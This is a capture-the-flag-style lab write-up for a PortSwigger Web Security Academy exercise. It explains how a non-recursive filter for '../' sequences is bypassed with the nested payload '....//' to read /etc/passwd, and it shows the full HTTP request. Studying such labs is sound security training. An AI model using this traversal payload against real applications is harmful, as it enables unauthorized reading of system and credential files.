# Path Traversal — Traversal sequences stripped non-recursively


**Difficulty:** Practitioner

**Status:** ✅ Solved



## Overview



This lab contains a **Path Traversal** vulnerability in the functionality that displays product images.



The application strips path traversal sequences from the user-supplied filename before using it.



However, the stripping is performed **non-recursively**, which allows us to bypass the filter.



The goal is to retrieve the contents of:



```text id="e3k3h9"

/etc/passwd

```



---



## Initial Request



When loading a product image, the application sends:




```http id="rj9mqp"


GET /image?filename=58.jpg HTTP/2

```



The important parameter is:



```text id="h9g4zs"

filename=58.jpg

```




This parameter controls the file that the application attempts to retrieve.



---




## The Filter



The application removes traversal sequences such as:



```text id="1s3f0k"

../

```




Therefore, a normal payload such as:



```text id="2j6xqk"

../../../etc/passwd

```



is stripped and does not work.



However, the lab specifies that the filtering is **non-recursive**.



### What does non-recursive mean?



The application removes the traversal sequence, but it does not repeatedly inspect the modified input for newly 
created traversal sequences.




For example:



```text id="d4wq7x"

....//

```



contains a traversal sequence in an overlapping/nested form.



After the filter removes one occurrence of `../`, another `../` can be exposed.



---



## Exploitation





We used the following payload:



```text id="5x2nqf"

....//....//....//etc/passwd

```



The resulting request is:



```http id="n7t2mv"

GET /image?filename=....//....//....//etc/passwd HTTP/2

```



After the non-recursive filtering, the input can effectively become:



```text id="w8p4kd"

../../../etc/passwd

```



The application then resolves the path and accesses:


```text id="j2s7px"

/etc/passwd

```



The contents of the file are returned, solving the lab.



---



## Attack Flow



```text id="z4v6sj"

User-controlled filename

        ↓

....//....//....//etc/passwd

        ↓

Non-recursive filtering

        ↓

../../../etc/passwd

        ↓

Path Traversal

        ↓

/etc/passwd

```


---



## Key Takeaways



* Path Traversal filters can sometimes be bypassed depending on how they process the input.

* Simply removing `../` is not always sufficient.

* **Non-recursive filtering** means the application does not repeatedly sanitize the resulting input.

* Nested or overlapping traversal sequences can cause a new `../` sequence to appear after filtering.

* Understanding the filter's behavior is more important than memorizing a specific payload.



## Lab Payload



```text id="3lq8yw"

....//....//....//etc/passwd

```


**Result:** Retrieved `/etc/passwd` and solved the lab. ✅



## References



* PortSwigger Web Security Academy — Path Traversal
  https://portswigger.net/web-security/file-path-traversal



* OWASP — Path Traversal
  https://owasp.org/www-community/attacks/Path_Traversal
